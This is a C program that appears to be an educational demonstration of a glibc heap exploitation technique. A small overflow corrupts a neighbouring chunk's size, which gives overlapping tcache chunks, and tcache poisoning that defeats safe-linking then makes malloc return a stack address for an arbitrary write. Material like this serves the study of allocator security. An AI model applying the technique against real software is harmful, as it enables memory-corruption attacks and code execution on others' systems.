#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

#define sz 0x100
#define sz2 0x200

int main()
{
    setbuf(stdin,0);
    setbuf(stdout,0);
    setbuf(stderr,0);

    size_t stack_var[0x10];
	size_t *target = NULL;

	// choose a properly aligned target address
	for(int i=0; i<0x10; i++) {
		if(((long)&stack_var[i] & 0xf) == 0) {
			target = &stack_var[i];
			break;
		}
	}
	assert(target != NULL);

    // prepare 3 chunks
    __uint64_t *p1 = malloc(sz);
    __uint64_t *p2 = malloc(sz);
    __uint64_t *p3 = malloc(sz);

    size_t usable_size = (sz + 8 + 15) & ~15;
    // [OVERFLOW 2 or more byte]
    // overflow p2.size through p1 into sz2, sz < sz2 <= tcache_size_threshold
    p1[usable_size/8 - 1] = sz2;

    // due to p2.size <= tcache_max
    // when free(p2) ptmalloc will do tcache procedure directly
    // instead of complex santinizing
    // tacahe_sz2 [ p2 ]
    free(p2);

    // let tacahe_sz [ p3 -> p1 ]
    free(p1);
    free(p3);

    // malloc(val), val should equal (sz2 + 8 + 15) & ~15
    // now choose sz-8
    // p4 will pick chunk from tacahe_sz2
    __uint64_t *p4 = malloc(sz2-8); // overlap!
    assert(p4 == p2);

    // usable_size/8 is a valid range for p4 to write
    // do tcache poisoning
    // we get tacahe_sz [ p3 -> target ]
    p4[usable_size/8] = (__uint64_t)((long)target ^ (long)(p4+usable_size) >> 12);

    // tacahe_sz [ target ]
    malloc(sz);
    // f = target
    __uint64_t *f = malloc(sz);
    assert(f == target); // arbitrary write

    return 0;
}
